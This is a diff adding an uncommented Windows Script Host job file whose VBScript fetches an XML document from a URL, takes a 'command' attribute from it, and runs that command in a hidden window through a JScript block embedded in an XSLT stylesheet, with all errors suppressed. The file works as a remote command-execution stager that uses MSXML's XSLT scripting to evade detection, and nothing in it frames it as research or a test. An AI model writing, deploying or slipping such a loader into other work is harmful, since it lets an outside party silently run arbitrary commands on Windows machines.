@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<job id="4e64c6b0-5f3b-4464-9e09-4e5dc38ab8a3">
+  <script language="VBScript">
+  <![CDATA[
+    On Error Resume Next
+
+    url = WScript.Arguments.Item(0)
+
+    Dim url, xml, xsltDoc, template, processor, c
+    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
+
+    xml.async = False
+    xml.setProperty "ProhibitDTD", False
+    xml.load(url)
+
+    If xml.parseError.errorCode <> 0 Then WScript.Quit
+
+    c = LCase(xml.documentElement.getAttribute("command"))
+    If c = "" Then WScript.Quit
+
+    Set xsltDoc = CreateObject("MSXML2.FreeThreadedDOMDocument.3.0")
+    xsltDoc.async = False
+    xsltDoc.loadXML _
+    "<?xml version='1.0'?>" & _
+    "<xsl:stylesheet version='1.0' " & _
+    "xmlns:xsl='http://www.w3.org/1999/XSL/Transform' " & _
+    "xmlns:msxsl='urn:schemas-microsoft-com:xslt' xmlns:user='x'>" & _
+      "<msxsl:script language='JScript' implements-prefix='user'>" & _
+        "function exec(c){" & _
+          "var s=new ActiveXObject('WScript.Shell');" & _
+          "s.Run(c,0,true);return '';" & _
+        "}" & _
+      "</msxsl:script>" & _
+      "<xsl:template match='/'>" & _
+        "<xsl:value-of select='user:exec(""" & c & """)'/>" & _
+      "</xsl:template>" & _
+    "</xsl:stylesheet>"
+
+    If xsltDoc.parseError.errorCode <> 0 Then WScript.Quit
+
+    Set template = CreateObject("MSXML2.XSLTemplate.3.0")
+    template.stylesheet = xsltDoc.documentElement
+
+    Set processor = template.createProcessor()
+    processor.input = xml
+    processor.transform()
+  ]]>
+  </script>
+</job>
